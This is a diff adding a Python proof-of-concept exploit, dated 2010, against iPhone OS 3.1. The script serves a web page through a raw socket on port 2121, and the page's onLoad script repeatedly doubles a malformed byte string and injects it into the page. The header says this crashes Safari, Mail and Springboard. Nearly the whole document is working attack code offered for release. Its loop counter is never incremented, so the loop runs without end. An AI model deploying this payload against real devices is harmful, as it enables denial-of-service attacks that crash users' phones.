@@ -1,0 +1,55 @@
+#!/usr/bin/python
+
+#iPhone Springboard crash PoC by Chase Higgins. Devices tested: iPhone 2G @ OS 3.1, iPhone 3GS @ 3.1.3
+#this script acts as webserver, and causes Safari, as well as Mail and Springboard to crash
+#all these apps crash after running this exploit on the iPhone. Unable to debug any of these processes as the gdb on my 
+#device is acting up, original iPhone is just too low memory to further test this exploit, so I am releasing it
+
+# Exploit Title: iPhone Springboard Malformed Character Crash PoC
+# Date: 3/15/2010
+# Author: Chase Higgins
+# Software Link: apple.com/iphone/
+# Version: iPhone 2G, iPhone 3GS
+# Tested on: iPhone OS 3.1, and iPhone OS 3.1.3
+# CVE : 
+# Code : none
+
+import sys, socket;
+
+def main():
+	html = """
+	<html>
+	<head>
+	<script>
+	function triggerCrash(){
+		evil_div = document.getElementById('evilDiv');
+		var evil_string = "\x4e\x5b\x01";
+		i = 0;
+
+		while (i < 1000){
+			evil_string = evil_string + evil_string;
+		}
+
+		evil_div.innerHTML = evil_string;
+	}
+	</script>
+	</head>
+	<body onLoad="triggerCrash()">
+	<div id="evilDiv">
+	 
+	</div>
+	</body>
+	</html>
+	""";
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+	s.bind(('',2121));
+	s.listen(1);
+	
+	while True:
+		channel, details = s.accept();
+		print channel.recv(1024);
+		channel.send(html);
+		channel.close();
+	
+main();
